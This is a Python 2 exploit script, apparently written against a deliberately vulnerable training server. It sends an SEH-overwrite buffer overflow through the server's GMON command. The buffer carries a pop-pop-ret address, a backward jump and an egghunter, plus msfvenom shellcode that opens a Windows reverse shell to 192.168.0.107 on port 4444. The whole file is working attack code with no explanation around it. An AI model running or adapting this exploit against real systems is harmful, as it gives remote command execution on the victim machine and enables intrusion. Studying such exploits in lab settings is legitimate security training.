import os
import socket
import sys

host= "192.168.0.106"
port= 9999
#pop pop ret 625010B4
seh = "\xB4\x10\x50\x62"

#jump 48 bytes backwards
nseh = "\xEb\xCE\x90\x90"

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x47\x4f\x55\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.107" EXITFUNC=thread -b "\x00" -f c
#351 bytes
payload = (
"\xda\xd6\xba\x72\xeb\xbf\xec\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x13\x03\x22\xf8\x5d\x19\x3e\x16\x23"
"\xe2\xbe\xe7\x44\x6a\x5b\xd6\x44\x08\x28\x49\x75\x5a\x7c\x66"
"\xfe\x0e\x94\xfd\x72\x87\x9b\xb6\x39\xf1\x92\x47\x11\xc1\xb5"
"\xcb\x68\x16\x15\xf5\xa2\x6b\x54\x32\xde\x86\x04\xeb\x94\x35"
"\xb8\x98\xe1\x85\x33\xd2\xe4\x8d\xa0\xa3\x07\xbf\x77\xbf\x51"
"\x1f\x76\x6c\xea\x16\x60\x71\xd7\xe1\x1b\x41\xa3\xf3\xcd\x9b"
"\x4c\x5f\x30\x14\xbf\xa1\x75\x93\x20\xd4\x8f\xe7\xdd\xef\x54"
"\x95\x39\x65\x4e\x3d\xc9\xdd\xaa\xbf\x1e\xbb\x39\xb3\xeb\xcf"
"\x65\xd0\xea\x1c\x1e\xec\x67\xa3\xf0\x64\x33\x80\xd4\x2d\xe7"
"\xa9\x4d\x88\x46\xd5\x8d\x73\x36\x73\xc6\x9e\x23\x0e\x85\xf6"
"\x80\x23\x35\x07\x8f\x34\x46\x35\x10\xef\xc0\x75\xd9\x29\x17"
"\x79\xf0\x8e\x87\x84\xfb\xee\x8e\x42\xaf\xbe\xb8\x63\xd0\x54"
"\x38\x8b\x05\xfa\x68\x23\xf6\xbb\xd8\x83\xa6\x53\x32\x0c\x98"
"\x44\x3d\xc6\xb1\xef\xc4\x81\x7d\x47\xc6\x3a\x16\x9a\xc6\xad"
"\xba\x13\x20\xa7\x52\x72\xfb\x50\xca\xdf\x77\xc0\x13\xca\xf2"
"\xc2\x98\xf9\x03\x8c\x68\x77\x17\x79\x99\xc2\x45\x2c\xa6\xf8"
"\xe1\xb2\x35\x67\xf1\xbd\x25\x30\xa6\xea\x98\x49\x22\x07\x82"
"\xe3\x50\xda\x52\xcb\xd0\x01\xa7\xd2\xd9\xc4\x93\xf0\xc9\x10"
"\x1b\xbd\xbd\xcc\x4a\x6b\x6b\xab\x24\xdd\xc5\x65\x9a\xb7\x81"
"\xf0\xd0\x07\xd7\xfc\x3c\xfe\x37\x4c\xe9\x47\x48\x61\x7d\x40"
"\x31\x9f\x1d\xaf\xe8\x1b\x3d\x52\x38\x56\xd6\xcb\xa9\xdb\xbb"
"\xeb\x04\x1f\xc2\x6f\xac\xe0\x31\x6f\xc5\xe5\x7e\x37\x36\x94"
"\xef\xd2\x38\x0b\x0f\xf7"
)


buffer = "GMON /.../"+ "GOUTGOUT" +payload+ "A"*3087 +"\x90"*11 +  egghunter + "\x90"*5 + nseh + seh + "C"*1498
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((buffer))
print conn.recv(1024)
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()

